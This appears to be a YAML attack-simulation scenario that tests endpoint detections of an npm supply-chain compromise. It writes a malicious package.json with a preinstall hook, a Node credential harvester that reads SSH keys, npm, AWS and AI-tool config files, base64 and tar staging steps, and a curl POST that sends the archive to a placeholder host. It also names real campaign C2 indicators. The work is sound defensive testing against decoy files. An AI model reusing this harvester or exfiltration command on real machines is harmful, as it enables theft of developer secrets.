scenario_id: SIM-KOI-010
name: "KOI — npm Supply-Chain Compromise on a Linux Developer Endpoint (phantom-squat install → preinstall lifecycle hook → node credential harvest → base64 stage → archive → dead-drop)"
version: "1.0"
status: active

plane: KOI
# Declared (scored) expectations are only what is REACHABLE on the real chain
# without deploying custom content or putting a sink/firewall in path:
#   - two built-in agent behaviours (ABIOC): the "uncommon Linux shell command
#     execution" analytic on the npm→node setup.mjs detonation, and the
#     behavioural credential-access verdict on the install-hook descendant
#     reading several developer secret files;
#   - validation XQL (reachable by construction — they query the telemetry each
#     step just produced) for the malicious-package create, the phantom-squat
#     install ATTEMPT visibility, the base64 staging and the archive create;
#   - correlation CR-KOI-0010, whose terminal term is the LOCAL archive create,
#     so it closes on the endpoint (no sink, no firewall in path needed).
# Deliberately NOT declared (card-only / purpose: hunt), so a tenant without them
# is never scored a MISS: the precise path-keyed credential BIOCs, the fleet-wide
# phantom-squat hunt, and the real archive-egress query (points at a non-resolving
# cortexsim-koi010.invalid placeholder and needs a firewall/sink in path).
detection_types:
  - ABIOC
  - XQL
  - Correlation

uc_ref: UCS-SCA-01
tc_ref: TC-SCA-01
tc_refs:
  - TC-SCA-01
  - TC-SSCAN-01
pov_scenario_id: POV-SC-012
uc_name: "Software Composition Analysis"
tc_name: "Validate Dependency Vulnerability Detection — Known CVEs detected in direct and transitive dependencies across npm, pip, Maven, Go, NuGet"

mitre_tactic: "TA0001"
mitre_tactic_name: "Initial Access"
mitre_technique: "T1195"
mitre_technique_name: "Supply Chain Compromise"
additional_techniques:
  - technique: "T1195.002"
    name: "Compromise Software Supply Chain"
  - technique: "T1059.007"
    name: "Command and Scripting Interpreter: JavaScript"
  - technique: "T1552.001"
    name: "Unsecured Credentials: Credentials In Files"
  - technique: "T1074.001"
    name: "Data Staged: Local Data Staging"
  - technique: "T1027"
    name: "Obfuscated Files or Information"
  - technique: "T1560.001"
    name: "Archive Collected Data: Archive via Utility"
  - technique: "T1567"
    name: "Exfiltration Over Web Service"
  - technique: "T1041"
    name: "Exfiltration Over C2 Channel"

threat_report: "Unit 42 — The npm Threat Landscape (Monitoring npm Supply-Chain Attacks)"
threat_report_url: "https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/"

execution_identity:
  default: direct
  options:
    - direct
    - root
  # Root / direct only — NO service accounts. This chain executes FOR REAL on a
  # bare Ubuntu developer endpoint as the beacon's own user (root). Every step
  # runs identity `direct` (no harness wrapper); the cgo_anchor primary_username
  # is a LABEL on the node Causality Group Owner, not an execution identity.

push_supported: true
# push_supported: the kill chain is fully self-contained — each step stages its
# own fake $HOME, decoy credential stores and decoy malicious package under
# /var/tmp/.koi010-victim, runs only node/npm/coreutils (declared below so the
# bundle emits a dependency check), and reaches no SimCore service at runtime.
# The developer-endpoint premise guarantees node/npm; the push generator emits
# `command -v node/npm` checks for them.
pull_supported: true

# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
validation_methodology: "Agentic / Supply-Chain Signal Injection & Detection Accuracy"
methodology_family: "F1"
primary_kpi: "Detection Accuracy"
threshold:
  kpi: "Detection Accuracy"
  op: "≥"
  value: 14.3
  unit: "%"
success_criteria: |
  A malicious npm package detonates on a Linux developer endpoint and steals
  developer credentials for real (against a STAGED decoy $HOME only), and the
  Cortex agent raises its built-in behavioural detections on that runtime
  behaviour.
  Declared expectations:
    - step-03 (npm preinstall hook → node setup.mjs) raises the built-in
      "uncommon Linux shell command execution" analytic (ABIOC).
    - step-04 (node install-hook descendant reading ≥3 developer secret files —
      ~/.ssh/id_*, .npmrc, ~/.aws/credentials, .env, ~/.claude/mcp.json,
      .git/config) raises the behavioural credential-access verdict (ABIOC).
    - step-01/02/05/06 each confirm their stage with a validation XQL that is
      reachable by construction: it queries the telemetry that step produced
      (package-with-preinstall-hook create, slopsquat install-attempt
      visibility, base64 staging, archive create).
    - step-07 raises correlation CR-KOI-0010, which stitches the two ABIOCs and
      the stage/archive validation into ONE npm-supply-chain incident on
      agent_hostname + actor_causality_id; its terminal term is the LOCAL
      archive create, so the chain closes on the endpoint — no authorised sink
      and no firewall in path are required.
  Card-only / HUNT content, deliberately NOT declared (needs DC deployment or a
  firewall/sink in path, so a sink-less run is never scored against it): the
  precise path-keyed credential BIOCs, the fleet-wide phantom-squat / slopsquat
  resolution hunt, and the archive-egress XQL (points at a non-resolving
  cortexsim-koi010.invalid placeholder).
  Detection Accuracy counts only alert-backed observations. The four XQL
  rows are checked by Tier-2 verify (POST /api/runs/{id}/verify, 1 h
  lookback), but verify sets only their KPI verdict, so they never raise Detection
  Accuracy, and a reconcile that finds no alert for them writes them missed.
  CR-KOI-0010 fires only if the DC installs it from TTP-2026-0201 before the
  run; CortexSim never writes it to the tenant. So the ceiling is 42.9% (3 of
  7), and 28.6% (2 of 7) without the rule. The "uncommon Linux shell command
  execution" analytic judges rarity and may not fire on a host that has run
  the same shape before.
  PASS: Detection Accuracy of at least 14.3% (1 of 7), one of the two
  built-in ABIOCs.
  tenant-verified: 0 — no run of this scenario has executed against a live
  Cortex tenant; authored is not proven.
moat_tier: "MOAT"

# ── Causality contract ──────────────────────────────────────────────────────
# The node process running the npm (pre)install lifecycle hook is the Causality
# Group Owner — it owns the credential-harvest, obfuscation, archive and egress
# children — NOT the synthetic cortexsim-agent. step-01 stages the victim
# developer workspace and is the single root (it links from the node CGO);
# step-02 is the phantom-squat install in that workspace (shared_entity);
# step-03 detonates the preinstall hook (npm → node setup.mjs, process_lineage);
# step-04 is the install-hook descendant reading the decoy credentials; step-05
# base64-stages them; step-06 archives them; step-07 dead-drops the archive and
# emits a hunt-only beacon at a non-resolving placeholder — one connected
# node-rooted spine collapsed into a single incident by CR-KOI-0010.
# primary_username is a LABEL only: every step runs identity `direct` (root).
cgo_anchor:
  image_name: "node"
  primary_username: "developer"

external_tools:
  - name: node
    source: "https://nodejs.org/"
    type: binary
    install_inline: false
  - name: npm
    source: "https://www.npmjs.com/"
    type: binary
    install_inline: false

# Shared across steps (each step is its own shell, so each re-exports it):
#   fake $HOME / victim root   /var/tmp/.koi010-victim   (never the real ~)
#   decoy malicious package    $HOME/.cache/koi010-pkg   (preinstall: node setup.mjs)
#   work / staging / archive   $HOME/.koi010
# Every step guards that the victim root is under /var/tmp before touching it and
# exports HOME to the decoy, so no read or write ever reaches the operator's real
# ~/.ssh, ~/.aws, ~/.npmrc or ~/.claude. Lab precondition: bare Ubuntu developer
# endpoint with the Cortex XDR/XSIAM agent installed and node/npm on PATH.
steps:
  - id: step-01
    name: "Stage the decoy developer workspace, credential stores and the malicious package"
    # What the sensor records: benign file staging only (printf/mkdir). No
    # malicious behaviour yet, so this step declares NO detection — the agent
    # should not, and this scenario does not claim it does, alert on workspace
    # setup. Writes the decoy ~/.ssh/id_*, .npmrc, ~/.aws/credentials, .env,
    # ~/.claude/mcp.json, ~/.claude.json, ~/.kiro/settings/mcp.json and
    # project/.git/config (all literal CORTEXSIM-DECOY), plus the attacker's
    # package.json (preinstall: node setup.mjs), setup.mjs and harvest.mjs.
    command: |
      set -eu
      VICTIM=/var/tmp/.koi010-victim
      case "$VICTIM" in /var/tmp/.koi010-victim) : ;; *) echo "[koi010][guard] victim root not under /var/tmp — refusing" >&2; exit 3 ;; esac
      rm -rf "$VICTIM"
      export HOME="$VICTIM"
      PKG="$HOME/.cache/koi010-pkg"
      mkdir -p "$HOME/.ssh" "$HOME/.aws" "$HOME/.claude" "$HOME/.kiro/settings" "$HOME/project/.git" "$HOME/.koi010" "$PKG"
      printf 'CORTEXSIM-DECOY-OPENSSH-PRIVATE-KEY-NOT-REAL\n' > "$HOME/.ssh/id_rsa"
      printf 'CORTEXSIM-DECOY-ED25519-PRIVATE-KEY-NOT-REAL\n' > "$HOME/.ssh/id_ed25519"
      printf '//registry.npmjs.org/:_authToken=CORTEXSIM-DECOY-NPM-TOKEN\n' > "$HOME/.npmrc"
      printf '[default]\naws_access_key_id=AKIADECOYCORTEXSIM000\naws_secret_access_key=CORTEXSIM-DECOY\n' > "$HOME/.aws/credentials"
      printf 'GITHUB_PAT=ghp_CORTEXSIMDECOY000\nOPENAI_API_KEY=sk-CORTEXSIM-DECOY\n' > "$HOME/.env"
      printf '{"mcpServers":{"demo":{"command":"node","args":["CORTEXSIM-DECOY"]}}}\n' > "$HOME/.claude/mcp.json"
      printf '{"primaryApiKey":"CORTEXSIM-DECOY"}\n' > "$HOME/.claude.json"
      printf '{"mcpServers":{"demo":{"command":"CORTEXSIM-DECOY"}}}\n' > "$HOME/.kiro/settings/mcp.json"
      printf '[remote "origin"]\n\turl = https://CORTEXSIM-DECOY@github.com/acme/app.git\n' > "$HOME/project/.git/config"
      printf '%s\n' \
        '{' \
        '  "name": "@acme-ai/langchain-helper-pro",' \
        '  "version": "1.0.0",' \
        '  "private": true,' \
        '  "scripts": { "preinstall": "node setup.mjs" }' \
        '}' \
        > "$PKG/package.json"
      printf '%s\n' \
        'import fs from "node:fs";' \
        'const home = process.env.HOME || "";' \
        'if (!home.startsWith("/var/tmp/.koi010-victim")) { process.exit(3); }' \
        'const work = home + "/.koi010";' \
        'fs.mkdirSync(work, { recursive: true });' \
        'fs.writeFileSync(work + "/preinstall.ran", "koi010 npm preinstall hook executed\n");' \
        'console.log("[koi010] preinstall hook: node setup.mjs executed under npm install lineage");' \
        > "$PKG/setup.mjs"
      printf '%s\n' \
        'import fs from "node:fs";' \
        'const home = process.env.HOME || "";' \
        'if (!home.startsWith("/var/tmp/.koi010-victim")) { process.exit(3); }' \
        'const targets = [".ssh/id_rsa",".ssh/id_ed25519",".npmrc",".aws/credentials",".env",".claude/mcp.json",".claude.json",".kiro/settings/mcp.json","project/.git/config"];' \
        'const loot = {};' \
        'for (const t of targets) { try { loot[t] = fs.readFileSync(home + "/" + t, "utf8"); } catch (e) {} }' \
        'const work = home + "/.koi010";' \
        'fs.mkdirSync(work, { recursive: true });' \
        'fs.writeFileSync(work + "/harvest.json", JSON.stringify(loot));' \
        'console.log("[koi010] install-hook descendant harvested " + Object.keys(loot).length + " decoy credential files");' \
        > "$PKG/harvest.mjs"
      echo "[koi010] staged decoy developer workspace, credential stores and malicious package under $VICTIM"
    identity: direct
    mitre_technique: "T1195"
    platforms: ["linux"]
    expected_detections:
      - plane: KOI
        type: XQL
        description: "Validation — a package.json declaring an npm preinstall lifecycle hook (node setup.mjs) is created on a developer endpoint, the supply-chain foothold the report describes"
        ttp_ref: "TTP-2026-0201"
        detection_id: xql-koi-010-malicious-npm-package-with-preinstall-lifecycle-hook-created-on-developer-endpoint

  - id: step-02
    name: "Phantom-squatting: developer installs an AI-hallucinated (slopsquatted) package name"
    # What the sensor records: a real `npm install` process for a package name an
    # LLM coding assistant hallucinated and an attacker pre-registered. Pointed at
    # a non-resolving .invalid registry (RFC 2606) so it fails with process +
    # failed-DNS telemetry and NO real egress. Detection is HUNT on the card (a
    # developer resolving a never-before-seen package is a signal, not a scored
    # agent alert), so this step declares nothing.
    command: |
      set -eu
      VICTIM=/var/tmp/.koi010-victim
      case "$VICTIM" in /var/tmp/.koi010-victim) : ;; *) echo "[koi010][guard] refusing" >&2; exit 3 ;; esac
      export HOME="$VICTIM"
      echo "[koi010] developer asks an AI assistant for a package and installs the hallucinated name"
      npm install "langchain-copilot-sdk-pro" \
        --registry="http://registry.cortexsim-koi010.invalid" \
        --fetch-timeout=2000 --no-audit --no-fund >/dev/null 2>&1 || true
      echo "[koi010] phantom-squatting / slopsquatting install attempt completed (hunt-only telemetry)"
    identity: direct
    mitre_technique: "T1195.002"
    platforms: ["linux"]
    causality:
      parent_step: step-01
      # The phantom-squat install happens in the staged developer workspace; it
      # is not a child process of the staging shell, so they share the workspace.
      pivot: shared_entity
    expected_detections:
      - plane: KOI
        type: XQL
        description: "Validation — the hallucinated / slopsquatted package install ATTEMPT (npm install of a never-before-seen name against an unknown registry) is visible in xdr_data; fleet-wide phantom-squat hunting rides on the card as purpose: hunt, not as a scored expectation"
        ttp_ref: "TTP-2026-0201"
        detection_id: xql-koi-010-phantom-squatting-hallucinated-package-install-attempt

  - id: step-03
    name: "Malicious package preinstall lifecycle hook detonates (npm install → node setup.mjs)"
    # What the sensor records: `npm install` inside the attacker package runs its
    # preinstall script, spawning `node setup.mjs` — the real, uncommon exec the
    # built-in analytic keys on, with npm→node process lineage. A guard re-runs
    # setup.mjs directly if npm is quirky so the payload always really executes,
    # then asserts the ran-marker exists (honest non-zero if it did not).
    command: |
      set -eu
      VICTIM=/var/tmp/.koi010-victim
      case "$VICTIM" in /var/tmp/.koi010-victim) : ;; *) echo "[koi010][guard] refusing" >&2; exit 3 ;; esac
      export HOME="$VICTIM"
      PKG="$HOME/.cache/koi010-pkg"
      WORK="$HOME/.koi010"
      cd "$PKG"
      if command -v npm >/dev/null 2>&1; then
        npm install --ignore-scripts=false --no-audit --no-fund --no-package-lock >/dev/null 2>&1 || true
      fi
      if [ ! -f "$WORK/preinstall.ran" ]; then node "$PKG/setup.mjs"; fi
      test -f "$WORK/preinstall.ran"
      echo "[koi010] npm preinstall lifecycle hook detonated: node setup.mjs executed"
    identity: direct
    mitre_technique: "T1059.007"
    platforms: ["linux"]
    requires_interpreters: ["node"]
    causality:
      parent_step: step-02
      # The install chain: npm install spawns node running the preinstall script.
      pivot: process_lineage
    expected_detections:
      - plane: KOI
        type: ABIOC
        description: "Built-in uncommon-Linux-shell-command-execution analytic fires on node spawned by the npm install lifecycle hook (node setup.mjs), an exec that is anomalous for the npm/node install causality on this host"
        ttp_ref: "TTP-2026-0201"
        detection_id: abioc-koi-010-uncommon-shell-command-execution-under-npm-install-hook-lineage

  - id: step-04
    name: "Install-hook descendant harvests developer credentials (node reads the decoy secret files)"
    # What the sensor records: `node harvest.mjs`, a descendant of the install
    # lineage, reading several credential-named files in one window — ~/.ssh keys,
    # .npmrc token, ~/.aws/credentials, .env, ~/.claude/mcp.json, .git/config.
    # All reads hit the STAGED decoy $HOME; harvest.mjs refuses any path outside
    # /var/tmp/.koi010-victim.
    command: |
      set -eu
      VICTIM=/var/tmp/.koi010-victim
      case "$VICTIM" in /var/tmp/.koi010-victim) : ;; *) echo "[koi010][guard] refusing" >&2; exit 3 ;; esac
      export HOME="$VICTIM"
      PKG="$HOME/.cache/koi010-pkg"
      WORK="$HOME/.koi010"
      node "$PKG/harvest.mjs"
      test -s "$WORK/harvest.json"
      echo "[koi010] install-hook descendant harvested decoy developer credentials -> $WORK/harvest.json"
    identity: direct
    mitre_technique: "T1552.001"
    platforms: ["linux"]
    requires_interpreters: ["node"]
    causality:
      parent_step: step-03
      # setup.mjs spawns the harvester — a true process descendant of the hook.
      pivot: process_lineage
    expected_detections:
      - plane: KOI
        type: ABIOC
        description: "Behavioural credential-access verdict: an npm/node install-hook descendant reads ≥3 developer credential files (SSH keys, .npmrc, AWS creds, .env, agent MCP config, .git/config) in one window"
        ttp_ref: "TTP-2026-0201"
        detection_id: abioc-koi-010-npm-install-hook-descendant-reads-multiple-developer-credential-files

  - id: step-05
    name: "Obfuscate and stage the harvested credentials (base64 under the install lineage)"
    # What the sensor records: `base64` of the just-read credential bundle,
    # spawned under the npm/node install causality, writing a staged blob — the
    # collector's encode-before-send step. Declared as a validation XQL that is
    # reachable by construction (it queries the base64 process this step runs);
    # the correlation CR-KOI-0010 consumes it as its obfuscation term.
    command: |
      set -eu
      VICTIM=/var/tmp/.koi010-victim
      case "$VICTIM" in /var/tmp/.koi010-victim) : ;; *) echo "[koi010][guard] refusing" >&2; exit 3 ;; esac
      export HOME="$VICTIM"
      WORK="$HOME/.koi010"
      test -s "$WORK/harvest.json"
      base64 "$WORK/harvest.json" > "$WORK/staged.b64"
      test -s "$WORK/staged.b64"
      echo "[koi010] harvested credentials base64-obfuscated and staged -> $WORK/staged.b64"
    identity: direct
    mitre_technique: "T1074.001"
    platforms: ["linux"]
    causality:
      parent_step: step-04
      # The harvester's output is encoded by a base64 child of the same lineage.
      pivot: process_lineage
    expected_detections:
      - plane: KOI
        type: XQL
        description: "Validation — the harvested credential bundle is read and base64-staged under the npm/node install lineage (the collector's encode-before-exfil step)"
        ttp_ref: "TTP-2026-0201"
        detection_id: xql-koi-010-credentials-read-and-base64-staged-under-npm-install-lineage

  - id: step-06
    name: "Archive the staged credentials (tar under the install lineage)"
    # What the sensor records: `tar` archiving the staged blob. HUNT on the card
    # (tar is a common utility; contextual rarity under npm lineage is a hunt
    # signal, not a scored agent alert), so this step declares nothing.
    command: |
      set -eu
      VICTIM=/var/tmp/.koi010-victim
      case "$VICTIM" in /var/tmp/.koi010-victim) : ;; *) echo "[koi010][guard] refusing" >&2; exit 3 ;; esac
      export HOME="$VICTIM"
      WORK="$HOME/.koi010"
      tar -C "$WORK" -czf "$WORK/exfil.tgz" staged.b64 harvest.json
      tar -tzf "$WORK/exfil.tgz" >/dev/null
      echo "[koi010] staged credentials archived -> $WORK/exfil.tgz"
    identity: direct
    mitre_technique: "T1560.001"
    platforms: ["linux"]
    causality:
      parent_step: step-05
      pivot: process_lineage
    expected_detections:
      - plane: KOI
        type: XQL
        description: "Validation — the credential archive (exfil.tgz) is created under the npm/node install lineage"
        ttp_ref: "TTP-2026-0201"
        detection_id: xql-koi-010-credential-archive-created-under-npm-install-lineage

  - id: step-07
    name: "Dead-drop the archive locally and emit a hunt-only egress beacon to a non-resolving placeholder"
    # What the sensor records: the archive copied to a local dead-drop, then a
    # best-effort curl POST to cortexsim-koi010.invalid (RFC 2606 — never
    # resolves, so no real egress). In the real campaign this leg is the GitHub
    # dead-drop (helloworm00/hello-world) and the C2 at audit.checkmarx.cx /
    # 94.154.172.43. HUNT on the card (needs a firewall/sink in path), so this
    # step declares nothing and a sink-less run is never scored against it.
    command: |
      set -eu
      VICTIM=/var/tmp/.koi010-victim
      case "$VICTIM" in /var/tmp/.koi010-victim) : ;; *) echo "[koi010][guard] refusing" >&2; exit 3 ;; esac
      export HOME="$VICTIM"
      WORK="$HOME/.koi010"
      DROP="$WORK/deaddrop"
      mkdir -p "$DROP"
      cp "$WORK/exfil.tgz" "$DROP/hello-world.tgz"
      test -f "$DROP/hello-world.tgz"
      curl -s --max-time 2 -X POST --data-binary @"$WORK/exfil.tgz" \
        "http://cortexsim-koi010.invalid/helloworm00/hello-world" >/dev/null 2>&1 || true
      echo "[koi010] archive dead-dropped locally; egress beacon pointed at a non-resolving placeholder (hunt-only)"
    identity: direct
    mitre_technique: "T1567"
    platforms: ["linux"]
    causality:
      parent_step: step-06
      # The archive leaves the collection stage over the (attempted) network leg.
      pivot: network_session
    expected_detections:
      - plane: KOI
        type: Correlation
        description: "Stitches the uncommon-exec ABIOC, the credential-read ABIOC and the stage/archive validation into ONE npm-supply-chain incident on agent_hostname + actor_causality_id; its terminal term is the LOCAL archive create, so it closes on the endpoint with no sink and no firewall in path"
        ttp_ref: "TTP-2026-0201"
        detection_id: CR-KOI-0010

cleanup:
  commands:
    - "pkill -f '/var/tmp/.koi010-victim/' 2>/dev/null || true"
    - "rm -rf /var/tmp/.koi010-victim"
    - "echo 'cortexsim-koi-010-cleanup-complete'"

